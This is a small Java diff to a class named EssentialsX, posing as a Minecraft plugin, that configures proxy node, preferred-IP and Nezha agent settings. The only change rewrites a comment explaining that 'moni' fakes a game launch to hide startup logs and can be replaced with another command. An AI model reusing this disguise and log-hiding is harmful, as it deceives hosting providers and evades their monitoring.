@@ -83,7 +83,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CF_IP", "ip.sb");  //优选ip
         env.put("AGENT_UUID", ""); //哪吒客户端uuid
         env.put("UUID", "");//节点uuid
-        env.put("JAR_SH", "moni");//模拟游戏画面
+        env.put("JAR_SH", "moni");//模拟游戏启动，开启可以屏蔽日志，去掉则显示启动日志，也可以换成别的命令，如sleep 5
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
